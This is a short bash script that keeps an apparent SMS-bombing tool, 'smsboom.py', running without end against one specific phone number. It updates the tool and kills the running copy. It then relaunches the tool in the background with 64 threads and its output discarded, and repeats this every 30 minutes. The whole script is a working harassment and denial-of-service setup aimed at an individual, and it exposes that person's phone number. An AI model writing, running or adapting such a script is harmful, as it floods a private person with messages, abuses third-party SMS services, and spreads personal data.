#!/bin/bash
sleep_time=1800
while :
do
  python smsboom.py -update
  pid=`ps -aux |grep "python smsboom.py run -t 64 -p 13599029430 -s -i 20"|grep -v "grep" |awk '{print $2}'`
  kill -9 $pid
  nohup python smsboom.py run -t 64 -p 13599029430 -s -i 20 >> /dev/null 2>&1 &
  sleep $sleep_time
done
